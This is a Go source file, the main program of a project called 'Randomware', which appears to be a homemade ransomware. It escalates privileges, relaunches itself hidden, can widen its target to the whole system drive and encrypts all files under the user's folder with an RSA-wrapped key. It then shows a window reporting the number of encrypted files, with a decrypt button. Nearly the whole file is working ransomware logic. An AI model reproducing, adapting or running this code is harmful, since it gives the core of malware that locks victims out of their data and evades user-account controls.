package main

import (
	//"Randomware/encryption"
	"Randomware/encryption"
	"Randomware/encryption/keys"
	"Randomware/environment"
	"Randomware/file"
	"Randomware/security/privilege"
	"log"
	"os"
	"os/exec"
	"strconv"
	"syscall"

	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
)

// checkElevate : initializes the environment variables
func checkElevate() bool {
	_, err := os.Create("C:\\test.txt")
	return err == nil
}

func main() {
	exePath, err := os.Executable()

	if err != nil {
		log.Fatal(err)
	}
	if exePath == "C:\\Users\\peter\\go\\src\\Randomware\\Randomware.exe" {
		print("Safe zone !")
		os.Exit(-1)
	}

	args := os.Args
	if len(args) != 1 {
		switch args[1] {
		case "-e1":
			if checkElevate() {
				dst, err := os.Create("C:\\firstStage.txt")
				if err == nil {
					defer dst.Close()
				}
				print("Admin")
				environment.Setup(true)
				print(environment.ExePath)
				var cmd *exec.Cmd
				cmd = exec.Command("cmd", "/C", "start "+environment.ExePath+" -e2")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, err = cmd.Output()
				if err != nil {
					print("Launch Failed")
					environment.SetupSafeFiles(false)
					environment.EncryptionRootPath = os.Getenv("SystemDrive") + "\\"
				} else {
					os.Exit(0)
				}
			} else {
				print("User")
				dst, _ := os.Create("C:\\Users\\peter\\You\\firstStage.txt")
				defer dst.Close()
				environment.SetupSafeFiles(false)
			}
		case "-e2":
			environment.SetupSafeFiles(true)
			dst, _ := os.Create("secondStage.txt")
			defer dst.Close()
		case "-c":
			environment.SetupSafeFiles(false)
		default:
			print("Bad argument")
			os.Exit(-2)

		}
	} else {
		if checkElevate() {
			environment.Setup(false)
			environment.Setup(true)
		} else {
			environment.Setup(false)
			print(environment.ExePath)
			privilege.WindowsEscalate(environment.ExePath + " -e1")
			os.Exit(0)
		}
	}
	var inTE, outTE *walk.TextEdit

	//File Encryption
	privateKey, publicKey := keys.GenerateKeyPair(4096)
	file.BytesToNewFile(environment.PubKeyFile, keys.PublicKeyToBytes(publicKey))
	file.BytesToNewFile(environment.PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
	//Encrypt file
	key := encryption.GenKey()
	file.BytesToNewFile(environment.EncryptedKeyFile, keys.EncryptWithPublicKey(key, publicKey))
	nbrFiles, err := file.EncryptAll(environment.UserPath, key)
	if err != nil {
		log.Fatal(err)
	}

	MainWindow{
		Title:   "Randomware",
		MinSize: Size{600, 400},
		Layout:  VBox{},
		Children: []Widget{
			HSplitter{
				Children: []Widget{
					TextEdit{AssignTo: &inTE},
					TextEdit{AssignTo: &outTE, ReadOnly: true},
				},
			},
			Label{
				Name: "Files encrypted :" + strconv.Itoa(int(nbrFiles)),
			},
			PushButton{
				Text: "Decrypt",
				OnClicked: func() {
					//File Decryption
					encryptedKey, err := file.BytesFromFile(environment.EncryptedKeyFile)
					if err != nil {
						log.Fatal(err)
					}
					privateKeyBytes, err := file.BytesFromFile(environment.PrivKeyFile)
					if err != nil {
						log.Fatal(err)
					}
					privateKey := keys.BytesToPrivateKey(privateKeyBytes)
					key := keys.DecryptWithPrivateKey(encryptedKey, privateKey)
					nbrFiles, err := file.DecryptAll(inTE.Text(), key)
					if err != nil {
						log.Fatal(err)
					}
					outTE.SetText("Decrypted files number: " + strconv.Itoa(int(nbrFiles)))
				},
			},
		},
	}.Run()
}
